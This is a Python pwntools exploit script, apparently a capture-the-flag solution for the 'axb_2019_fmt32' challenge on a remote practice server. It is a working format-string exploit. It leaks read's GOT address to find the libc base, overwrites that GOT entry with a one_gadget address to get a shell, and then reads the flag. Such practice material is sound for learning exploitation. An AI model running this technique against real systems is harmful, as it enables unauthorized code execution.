from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 28765)

elf = ELF('../axb_2019_fmt32')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')

read_got = elf.got['read']

payload = b'a' + p32(read_got) + b'%8$s'
target.sendlineafter('tell me:', payload)
read_addr = u32(target.recv(18)[-4:])
libc_base = read_addr - libc.sym['read']
one_gadget = 0x3a812 + libc_base

payload = b'a' + \
    fmtstr_payload(8, {read_got: one_gadget},
                   write_size="byte", numbwritten=0xa)
target.sendafter('tell me:', payload)
target.sendline('cat flag')
target.interactive()